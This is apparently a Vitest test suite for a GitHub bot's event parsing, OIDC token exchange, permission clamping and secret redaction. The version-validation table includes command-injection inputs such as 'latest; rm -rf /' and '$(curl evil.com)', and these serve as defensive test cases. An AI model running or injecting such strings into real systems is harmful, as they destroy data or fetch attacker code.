import { describe, it, expect } from "vitest";
import {
  extractPrompt,
  detectFork,
  parseWorkflowRunEvent,
  getModel,
  formatResponse,
  generateBranchName,
} from "../src/events";
import {
  extractRepoFromClaims,
  extractBearerToken,
  handleExchangeTokenForRepo,
  handleExchangeTokenWithPAT,
  resolvePermissions,
} from "../src/oidc";
import { sanitizeSecrets } from "../src/log";
import { queryAnalyticsEngine, emitMetric } from "../src/metrics";
import { verifyWebhook, createWebhooks } from "../src/github";
import { GitHubAPIError, MetricsError } from "../src/errors";
import { validateOpenCodeVersion } from "../github/script/context";
import type { Env } from "../src/types";
import type { WorkflowRunPayload } from "../src/types";

// Proxy-based mock Env that throws on unexpected property access.
// Ensures tests only touch properties they explicitly provide, preventing
// silent undefined returns from missing stubs.
function createMockEnv(overrides: Partial<Env> = {}): Env {
  const values: Record<string, unknown> = {
    APP_INSTALLATIONS: {
      get: async () => null,
      put: async () => {},
    },
    GITHUB_APP_ID: "123",
    GITHUB_APP_PRIVATE_KEY: "test-key",
    GITHUB_WEBHOOK_SECRET: "test-secret",
    OPENCODE_API_KEY: "test-api-key",
    DEFAULT_MODEL: "anthropic/claude-opus-4-5",
    ALLOWED_ORGS: [],
    ...overrides,
  };

  return new Proxy(values as unknown as Env, {
    get(target, prop, receiver) {
      // Allow symbols, serialization helpers, and thenable checks (Promise.resolve probes .then)
      if (typeof prop === "symbol" || prop === "toJSON" || prop === "then") {
        return Reflect.get(target, prop, receiver);
      }
      if (prop in target) {
        return Reflect.get(target, prop, receiver);
      }
      // Optional Env fields (marked with `?` in the Env interface) don't need stubs
      if (
        prop === "ASK_SECRET" ||
        prop === "CLOUDFLARE_ACCOUNT_ID" ||
        prop === "ANALYTICS_TOKEN" ||
        prop === "ENABLE_PAT_EXCHANGE" ||
        prop === "BONK_MAX_TRACK_SECS"
      ) {
        return undefined;
      }
      throw new Error(
        `Mock Env: unexpected property access "${String(prop)}". Add it to createMockEnv overrides.`,
      );
    },
  });
}

// ---------------------------------------------------------------------------
// Fork Detection (tested once, directly against the exported helper)
// ---------------------------------------------------------------------------

describe("Fork Detection", () => {
  it.each([
    {
      head: "forked-owner/repo",
      base: "owner/repo",
      expected: true,
      label: "different full_name",
    },
    {
      head: "owner/repo",
      base: "owner/repo",
      expected: false,
      label: "same full_name",
    },
    { head: null, base: "owner/repo", expected: true, label: "null head repo" },
    {
      head: undefined,
      base: "owner/repo",
      expected: true,
      label: "undefined head repo",
    },
    { head: "", base: "owner/repo", expected: true, label: "empty head repo" },
  ])("$label → $expected", ({ head, base, expected }) => {
    expect(detectFork(head, base)).toBe(expected);
  });
});

// ---------------------------------------------------------------------------
// Prompt Extraction
// ---------------------------------------------------------------------------

describe("Prompt Extraction", () => {
  it("extracts full prompt", () => {
    const prompt = extractPrompt("@ask-bonk fix the type error");
    expect(prompt).toBe("@ask-bonk fix the type error");
  });

  it("returns prompt as-is for bare mention", () => {
    const prompt = extractPrompt("@ask-bonk");
    expect(prompt).toBe("@ask-bonk");
  });

  it("includes review context when provided", () => {
    const reviewContext = {
      file: "src/utils.ts",
      diffHunk: "@@ -1,3 +1,4 @@\n+const x = 1;",
      line: 5,
      originalLine: 4,
      position: 2,
      commitId: "abc123",
      originalCommitId: "def456",
    };
    const prompt = extractPrompt("@ask-bonk improve this", reviewContext);
    expect(prompt).toContain("src/utils.ts");
    expect(prompt).toContain("line 5");
  });
});

// ---------------------------------------------------------------------------
// Model Configuration (table-driven)
// ---------------------------------------------------------------------------

describe("Model Configuration", () => {
  it.each([
    {
      input: "anthropic/claude-opus-4-5",
      provider: "anthropic",
      model: "claude-opus-4-5",
    },
    {
      input: "opencode/claude-3-5-sonnet-v2",
      provider: "opencode",
      model: "claude-3-5-sonnet-v2",
    },
    {
      input: "google/gemini-2.5-pro",
      provider: "google",
      model: "gemini-2.5-pro",
    },
  ])("parses $input → $provider/$model", ({ input, provider, model }) => {
    const env = createMockEnv({ DEFAULT_MODEL: input });
    const result = getModel(env);
    expect(result.providerID).toBe(provider);
    expect(result.modelID).toBe(model);
  });

  it("returns hardcoded default when no DEFAULT_MODEL", () => {
    const env = createMockEnv({ DEFAULT_MODEL: undefined as unknown as string });
    const result = getModel(env);
    expect(result.providerID).toBe("opencode");
    expect(result.modelID).toBe("claude-opus-4-5");
  });

  it("throws on invalid model format without slash", () => {
    const env = createMockEnv({ DEFAULT_MODEL: "invalid-model" });
    expect(() => getModel(env)).toThrow("Invalid model");
  });
});

// ---------------------------------------------------------------------------
// Response Formatting
// ---------------------------------------------------------------------------

describe("Response Formatting", () => {
  it("formats basic response", () => {
    const response = formatResponse("Here is the fix", null, null, "anthropic/claude-opus-4-5");
    expect(response).toContain("Here is the fix");
    expect(response).toContain("`anthropic/claude-opus-4-5`");
  });

  it("includes changed files", () => {
    const response = formatResponse(
      "Fixed the issue",
      ["src/utils.ts", "src/index.ts"],
      null,
      "anthropic/claude-opus-4-5",
    );
    expect(response).toContain("Files changed");
    expect(response).toContain("`src/utils.ts`");
    expect(response).toContain("`src/index.ts`");
  });

  it("includes session link for public repos", () => {
    const response = formatResponse(
      "Done",
      null,
      "https://opencode.ai/s/abc123",
      "anthropic/claude-opus-4-5",
    );
    expect(response).toContain("[View session](https://opencode.ai/s/abc123)");
  });
});

// ---------------------------------------------------------------------------
// Branch Name Generation
// ---------------------------------------------------------------------------

describe("Branch Name Generation", () => {
  it("generates issue branch name", () => {
    const branch = generateBranchName("issue", 42);
    expect(branch).toMatch(/^bonk\/issue42-\d{14}$/);
  });

  it("generates PR branch name", () => {
    const branch = generateBranchName("pr", 99);
    expect(branch).toMatch(/^bonk\/pr99-\d{14}$/);
  });
});

// ---------------------------------------------------------------------------
// Workflow Run Event Parsing (table-driven conclusion filtering)
// ---------------------------------------------------------------------------

describe("Workflow Run Event Parsing", () => {
  const validPayload: WorkflowRunPayload = {
    action: "completed",
    workflow_run: {
      id: 12345,
      name: "Bonk",
      path: ".github/workflows/bonk.yml",
      status: "completed",
      conclusion: "failure",
      html_url: "https://github.com/test-owner/test-repo/actions/runs/12345",
      event: "issue_comment",
      head_branch: "main",
      triggering_actor: { login: "contributor" },
      pull_requests: [{ number: 42 }],
    },
    repository: {
      owner: { login: "test-owner" },
      name: "test-repo",
      full_name: "test-owner/test-repo",
      private: false,
    },
    sender: { login: "testuser" },
  };

  it("parses valid failure event with all fields", () => {
    const result = parseWorkflowRunEvent(validPayload);

    expect(result).not.toBeNull();
    expect(result?.owner).toBe("test-owner");
    expect(result?.repo).toBe("test-repo");
    expect(result?.runId).toBe(12345);
    expect(result?.conclusion).toBe("failure");
    expect(result?.workflowName).toBe("Bonk");
    expect(result?.workflowPath).toBe(".github/workflows/bonk.yml");
    expect(result?.triggerEvent).toBe("issue_comment");
    expect(result?.triggeringActor).toBe("contributor");
    expect(result?.pullRequestNumbers).toEqual([42]);
  });

  it("handles empty pull_requests for fork PRs", () => {
    const forkPayload: WorkflowRunPayload = {
      ...validPayload,
      workflow_run: {
        ...validPayload.workflow_run,
        pull_requests: [],
      },
    };
    const result = parseWorkflowRunEvent(forkPayload);
    expect(result).not.toBeNull();
    expect(result?.pullRequestNumbers).toEqual([]);
  });

  it("handles missing pull_requests and triggering_actor", () => {
    const minimalPayload: WorkflowRunPayload = {
      ...validPayload,
      workflow_run: {
        id: 12345,
        name: "Bonk",
        path: ".github/workflows/bonk.yml",
        status: "completed",
        conclusion: "failure",
        html_url: "https://github.com/test-owner/test-repo/actions/runs/12345",
        event: "issue_comment",
        head_branch: "main",
      },
    };
    const result = parseWorkflowRunEvent(minimalPayload);
    expect(result).not.toBeNull();
    expect(result?.triggeringActor).toBeUndefined();
    expect(result?.pullRequestNumbers).toEqual([]);
  });

  it("returns null for non-completed action", () => {
    const payload = { ...validPayload, action: "requested" };
    expect(parseWorkflowRunEvent(payload)).toBeNull();
  });

  // Conclusion allowlist: failure, cancelled, timed_out, action_required are
  // parsed. Everything else returns null.
  it.each([
    { conclusion: "failure", parsed: true },
    { conclusion: "cancelled", parsed: true },
    { conclusion: "timed_out", parsed: true },
    { conclusion: "action_required", parsed: true },
    { conclusion: "success", parsed: false },
    { conclusion: "skipped", parsed: false },
    { conclusion: "neutral", parsed: false },
    { conclusion: "stale", parsed: false },
  ])("conclusion=$conclusion → parsed=$parsed", ({ conclusion, parsed }) => {
    const payload = {
      ...validPayload,
      workflow_run: { ...validPayload.workflow_run, conclusion },
    };
    const result = parseWorkflowRunEvent(payload);
    if (parsed) {
      expect(result).not.toBeNull();
      expect(result?.conclusion).toBe(conclusion);
    } else {
      expect(result).toBeNull();
    }
  });
});

// ---------------------------------------------------------------------------
// OIDC Claim Parsing
// ---------------------------------------------------------------------------

describe("OIDC Claim Parsing", () => {
  it("extracts owner and repo from claims", () => {
    const claims = {
      iss: "https://token.actions.githubusercontent.com",
      sub: "repo:octocat/hello-world:ref:refs/heads/main",
      aud: "opencode-github-action",
      exp: Math.floor(Date.now() / 1000) + 3600,
      iat: Math.floor(Date.now() / 1000),
      repository: "octocat/hello-world",
      repository_owner: "octocat",
      repository_id: "123456",
      repository_owner_id: "789",
      run_id: "1234567890",
      run_number: "42",
      run_attempt: "1",
      actor: "octocat",
      actor_id: "789",
      workflow: "CI",
      event_name: "push",
      ref: "refs/heads/main",
      ref_type: "branch",
      job_workflow_ref: "octocat/hello-world/.github/workflows/ci.yml@refs/heads/main",
      runner_environment: "github-hosted",
    };

    const result = extractRepoFromClaims(claims);
    expect(result.isOk()).toBe(true);
    if (result.isOk()) {
      expect(result.value.owner).toBe("octocat");
      expect(result.value.repo).toBe("hello-world");
    }
  });

  it("handles repos with multiple dashes/underscores", () => {
    const claims = {
      repository: "my-org/my-complex_repo-name",
    } as any;
    const result = extractRepoFromClaims(claims);
    expect(result.isOk()).toBe(true);
    if (result.isOk()) {
      expect(result.value.owner).toBe("my-org");
      expect(result.value.repo).toBe("my-complex_repo-name");
    }
  });

  it("rejects malformed repository claims", () => {
    const claims = {
      repository: "octocat",
    } as any;
    const result = extractRepoFromClaims(claims);
    expect(result.isErr()).toBe(true);
    if (result.isErr()) {
      expect(result.error.message).toContain("Invalid repository claim");
    }
  });
});

describe("Authorization Header Parsing", () => {
  it("extracts bearer token only from valid header format", () => {
    expect(extractBearerToken("Bearer token123")).toBe("token123");
    expect(extractBearerToken("Bearer ")).toBeNull();
    expect(extractBearerToken("Basic token123")).toBeNull();
    expect(extractBearerToken(null)).toBeNull();
    expect(extractBearerToken(undefined)).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// Cross-Repo Token Exchange — auth header validation
// These test early rejection before any OIDC or network calls.
// ---------------------------------------------------------------------------

describe("Cross-Repo Token Exchange Input Validation", () => {
  const testEnv = createMockEnv();

  it("rejects requests without Authorization header", async () => {
    const result = await handleExchangeTokenForRepo(testEnv, null, {
      owner: "test-org",
      repo: "test-repo",
    });

    expect(result.isErr()).toBe(true);
    if (result.isErr()) {
      expect(result.error.message).toContain("Authorization");
    }
  });

  it("rejects requests with non-Bearer Authorization", async () => {
    const result = await handleExchangeTokenForRepo(testEnv, "Basic abc123", {
      owner: "test-org",
      repo: "test-repo",
    });

    expect(result.isErr()).toBe(true);
    if (result.isErr()) {
      expect(result.error.message).toContain("Authorization");
    }
  });
});

// ---------------------------------------------------------------------------
// PAT Exchange Security (table-driven prefix validation)
// ---------------------------------------------------------------------------

describe("PAT Exchange Security", () => {
  const patEnvDisabled = createMockEnv();
  const patEnvEnabled = createMockEnv({ ENABLE_PAT_EXCHANGE: "true" });

  it("rejects PAT exchange when disabled (default)", async () => {
    const result = await handleExchangeTokenWithPAT(patEnvDisabled, "Bearer github_pat_test123", {
      owner: "test-org",
      repo: "test-repo",
    });

    expect(result.isErr()).toBe(true);
    if (result.isErr()) {
      expect(result.error.message).toBe("PAT exchange is disabled");
    }
  });

  // Token prefix validation: only github_pat_ and ghp_ are allowed.
  // Other prefixes (ghs_, gho_, etc.) must be rejected.
  it.each([
    { prefix: "github_pat_", accepted: true },
    { prefix: "ghp_", accepted: true },
    { prefix: "ghs_", accepted: false },
    { prefix: "gho_", accepted: false },
    { prefix: "random_", accepted: false },
  ])("prefix $prefix → accepted=$accepted", async ({ prefix, accepted }) => {
    const result = await handleExchangeTokenWithPAT(
      patEnvEnabled,
      `Bearer ${prefix}test_token_value`,
      { owner: "test-org", repo: "test-repo" },
    );

    expect(result.isErr()).toBe(true);
    if (result.isErr()) {
      if (accepted) {
        // Passed format check, failed on the GitHub API call
        expect(result.error.message).not.toContain("expected a GitHub PAT");
      } else {
        expect(result.error.message).toContain("expected a GitHub PAT");
      }
    }
  });

  // Body validation in handleExchangeTokenWithPAT is reachable without network calls
  // because it happens after format checks but before the GitHub API call.
  it("rejects requests missing owner in body", async () => {
    const result = await handleExchangeTokenWithPAT(patEnvEnabled, "Bearer github_pat_test123", {
      repo: "test-repo",
    });

    expect(result.isErr()).toBe(true);
    if (result.isErr()) {
      expect(result.error.message).toContain("Missing owner or repo");
    }
  });

  it("rejects requests missing repo in body", async () => {
    const result = await handleExchangeTokenWithPAT(patEnvEnabled, "Bearer github_pat_test123", {
      owner: "test-org",
    });

    expect(result.isErr()).toBe(true);
    if (result.isErr()) {
      expect(result.error.message).toContain("Missing owner or repo");
    }
  });
});

// ---------------------------------------------------------------------------
// Webhook Verification I/O Boundary
// ---------------------------------------------------------------------------

describe("Webhook Verification", () => {
  it("returns error Result for missing webhook headers", async () => {
    const env = createMockEnv();
    const webhooks = createWebhooks(env);

    // Request with no GitHub webhook headers
    const request = new Request("https://example.com/webhooks", {
      method: "POST",
      body: "{}",
    });

    const result = await verifyWebhook(webhooks, request);
    expect(result.isErr()).toBe(true);
    if (result.isErr()) {
      expect(GitHubAPIError.is(result.error)).toBe(true);
      expect(result.error.message).toContain("Missing required webhook headers");
      expect(result.error.operation).toBe("verifyWebhook");
    }
  });

  it("returns error Result for invalid signature", async () => {
    const env = createMockEnv();
    const webhooks = createWebhooks(env);

    // Request with headers but bad signature
    const request = new Request("https://example.com/webhooks", {
      method: "POST",
      headers: {
        "x-github-delivery": "test-delivery-id",
        "x-github-event": "issue_comment",
        "x-hub-signature-256": "sha256=invalid",
      },
      body: JSON.stringify({ action: "created" }),
    });

    const result = await verifyWebhook(webhooks, request);
    expect(result.isErr()).toBe(true);
    if (result.isErr()) {
      expect(GitHubAPIError.is(result.error)).toBe(true);
      expect(result.error.operation).toBe("verifyWebhook");
    }
  });
});

// ---------------------------------------------------------------------------
// Analytics Engine Query I/O Boundary
// ---------------------------------------------------------------------------

describe("Analytics Engine Query", () => {
  it("returns MetricsError when not configured", async () => {
    const env = createMockEnv({
      CLOUDFLARE_ACCOUNT_ID: undefined as unknown as string,
      ANALYTICS_TOKEN: undefined as unknown as string,
    });

    const result = await queryAnalyticsEngine(env, "SELECT 1");
    expect(result.isErr()).toBe(true);
    if (result.isErr()) {
      expect(MetricsError.is(result.error)).toBe(true);
      expect(result.error.message).toContain("not configured");
      expect(result.error.operation).toBe("queryAnalyticsEngine");
    }
  });

  it("returns MetricsError when account ID is missing", async () => {
    const env = createMockEnv({
      CLOUDFLARE_ACCOUNT_ID: undefined as unknown as string,
      ANALYTICS_TOKEN: "test-token",
    });

    const result = await queryAnalyticsEngine(env, "SELECT 1");
    expect(result.isErr()).toBe(true);
    if (result.isErr()) {
      expect(MetricsError.is(result.error)).toBe(true);
    }
  });

  it("returns MetricsError when token is missing", async () => {
    const env = createMockEnv({
      CLOUDFLARE_ACCOUNT_ID: "test-account",
      ANALYTICS_TOKEN: undefined as unknown as string,
    });

    const result = await queryAnalyticsEngine(env, "SELECT 1");
    expect(result.isErr()).toBe(true);
    if (result.isErr()) {
      expect(MetricsError.is(result.error)).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// Metrics Emit (best-effort, never throws)
// ---------------------------------------------------------------------------

describe("Metrics Emit", () => {
  it("does not throw when BONK_EVENTS binding is missing", () => {
    const env = createMockEnv();
    // emitMetric should be best-effort — no exception even with missing binding
    expect(() => {
      emitMetric(env, {
        repo: "test-owner/test-repo",
        eventType: "webhook",
        status: "success",
      });
    }).not.toThrow();
  });
});

// ---------------------------------------------------------------------------
// Token Permission Scoping
// ---------------------------------------------------------------------------

describe("resolvePermissions", () => {
  const DEFAULTS = {
    contents: "write",
    issues: "write",
    pull_requests: "write",
    metadata: "read",
  };

  // --- no input / fallback ---

  it("returns defaults when no permissions provided", () => {
    expect(resolvePermissions()).toEqual(DEFAULTS);
  });

  it("returns defaults for undefined input", () => {
    expect(resolvePermissions(undefined)).toEqual(DEFAULTS);
  });

  it("returns defaults for empty object", () => {
    expect(resolvePermissions({})).toEqual(DEFAULTS);
  });

  // --- preset names ---

  it("resolves NO_PUSH preset", () => {
    expect(resolvePermissions("NO_PUSH")).toEqual({
      contents: "read",
      issues: "write",
      pull_requests: "write",
      metadata: "read",
    });
  });

  it("resolves WRITE preset (matches defaults)", () => {
    expect(resolvePermissions("WRITE")).toEqual(DEFAULTS);
  });

  it("resolves presets case-insensitively", () => {
    // Action inputs arrive as strings — test that runtime handles mixed case
    expect(resolvePermissions("no_push" as any)).toEqual(resolvePermissions("NO_PUSH"));
    expect(resolvePermissions("Write" as any)).toEqual(resolvePermissions("WRITE"));
  });

  it("falls back to NO_PUSH for unknown preset name", () => {
    expect(resolvePermissions("NONSENSE" as any)).toEqual({
      contents: "read",
      issues: "write",
      pull_requests: "write",
      metadata: "read",
    });
  });

  // --- custom object: downgrade ---

  it("downgrades contents from write to read", () => {
    const result = resolvePermissions({ contents: "read" });
    expect(result.contents).toBe("read");
    expect(result.issues).toBe("write");
    expect(result.pull_requests).toBe("write");
    expect(result.metadata).toBe("read");
  });

  it("downgrades multiple permissions", () => {
    const result = resolvePermissions({
      contents: "read",
      pull_requests: "read",
    });
    expect(result.contents).toBe("read");
    expect(result.pull_requests).toBe("read");
    expect(result.issues).toBe("write");
    expect(result.metadata).toBe("read");
  });

  // --- custom object: no escalation ---

  it("refuses to escalate metadata beyond its default", () => {
    // metadata defaults to "read" — passing "write" via untrusted JSON must be clamped
    const result = resolvePermissions({ metadata: "write" } as any);
    expect(result.metadata).toBe("read");
  });

  it("keeps default when requested level matches", () => {
    const result = resolvePermissions({
      contents: "write",
      issues: "write",
    });
    expect(result.contents).toBe("write");
    expect(result.issues).toBe("write");
  });

  it("ignores unknown permission keys", () => {
    const result = resolvePermissions({
      contents: "read",
      actions: "write",
    } as any);
    expect(result.contents).toBe("read");
    expect((result as any).actions).toBeUndefined();
  });

  // --- invalid values from untrusted JSON ---

  it("falls back to NO_PUSH for invalid string values like 'admin'", () => {
    const NO_PUSH = { contents: "read", issues: "write", pull_requests: "write", metadata: "read" };
    expect(resolvePermissions({ contents: "admin" } as any)).toEqual(NO_PUSH);
  });

  it("falls back to NO_PUSH for non-string values", () => {
    const NO_PUSH = { contents: "read", issues: "write", pull_requests: "write", metadata: "read" };
    expect(resolvePermissions({ contents: 123 } as any)).toEqual(NO_PUSH);
  });

  it("falls back to NO_PUSH when all values are invalid", () => {
    const NO_PUSH = { contents: "read", issues: "write", pull_requests: "write", metadata: "read" };
    const result = resolvePermissions({
      contents: "admin",
      issues: 123,
      pull_requests: "banana",
      metadata: "root",
    } as any);
    expect(result).toEqual(NO_PUSH);
  });

  it("applies valid keys and skips invalid ones in mixed input", () => {
    const result = resolvePermissions({ contents: "read", issues: "banana" } as any);
    expect(result).toEqual({
      contents: "read",
      issues: "write",
      pull_requests: "write",
      metadata: "read",
    });
  });

  it("falls back to NO_PUSH for array input", () => {
    const NO_PUSH = { contents: "read", issues: "write", pull_requests: "write", metadata: "read" };
    expect(resolvePermissions(["NO_PUSH"] as any)).toEqual(NO_PUSH);
  });

  it("falls back to NO_PUSH for numeric input", () => {
    const NO_PUSH = { contents: "read", issues: "write", pull_requests: "write", metadata: "read" };
    expect(resolvePermissions(42 as any)).toEqual(NO_PUSH);
  });
});

// ---------------------------------------------------------------------------
// OpenCode Version Validation
// ---------------------------------------------------------------------------

describe("OpenCode Version Validation", () => {
  it.each([
    { input: undefined, expected: "latest", label: "undefined" },
    { input: "", expected: "latest", label: "empty string" },
    { input: "  ", expected: "latest", label: "whitespace only" },
    { input: "latest", expected: "latest", label: "latest" },
    { input: "dev", expected: "dev", label: "dev" },
    { input: "1.2.16", expected: "1.2.16", label: "basic semver" },
    { input: "0.1.0", expected: "0.1.0", label: "zero major" },
    { input: "1.2.16-beta.1", expected: "1.2.16-beta.1", label: "pre-release" },
    { input: "1.2.16-rc1", expected: "1.2.16-rc1", label: "rc pre-release" },
    { input: " 1.2.16 ", expected: "1.2.16", label: "trimmed semver" },
    { input: "not-a-version", expected: "latest", label: "arbitrary string" },
    { input: "v1.2.16", expected: "latest", label: "v-prefixed (invalid)" },
    { input: "1.2", expected: "latest", label: "incomplete semver" },
    { input: "1.2.16.4", expected: "latest", label: "four-part version" },
    { input: "latest; rm -rf /", expected: "latest", label: "injection attempt" },
    { input: "1.2.16 && echo pwned", expected: "latest", label: "command injection" },
    { input: "$(curl evil.com)", expected: "latest", label: "subshell injection" },
  ])("$label ($input) → $expected", ({ input, expected }) => {
    expect(validateOpenCodeVersion(input)).toBe(expected);
  });
});

// ---------------------------------------------------------------------------
// Logging Security (table-driven)
// ---------------------------------------------------------------------------

describe("Logging Security", () => {
  it.each([
    {
      label: "redacts token in HTTPS URL",
      input: "https://x-access-token:ghp_secret123@github.com/owner/repo.git",
      expected: "https://x-access-token:[REDACTED]@github.com/owner/repo.git",
      mustNotContain: ["ghp_secret123"],
    },
    {
      label: "redacts token in error message with URL",
      input:
        "Failed to clone https://x-access-token:ghs_token456@github.com/org/repo.git: permission denied",
      expected:
        "Failed to clone https://x-access-token:[REDACTED]@github.com/org/repo.git: permission denied",
      mustNotContain: ["ghs_token456"],
    },
    {
      label: "redacts multiple URLs in same string",
      input: "Tried https://user:pass1@example.com and https://other:pass2@example.org",
      expected:
        "Tried https://user:[REDACTED]@example.com and https://other:[REDACTED]@example.org",
      mustNotContain: ["pass1", "pass2"],
    },
    {
      label: "preserves strings without URLs",
      input: "Normal error message without any URLs",
      expected: "Normal error message without any URLs",
      mustNotContain: null,
    },
    {
      label: "preserves URLs without credentials",
      input: "See https://github.com/owner/repo for details",
      expected: "See https://github.com/owner/repo for details",
      mustNotContain: null,
    },
  ])("$label", ({ input, expected, mustNotContain }) => {
    const sanitized = sanitizeSecrets(input);
    if (expected !== null) {
      expect(sanitized).toBe(expected);
    }
    if (mustNotContain !== null) {
      for (const secret of mustNotContain) {
        expect(sanitized).not.toContain(secret);
      }
    }
  });
});
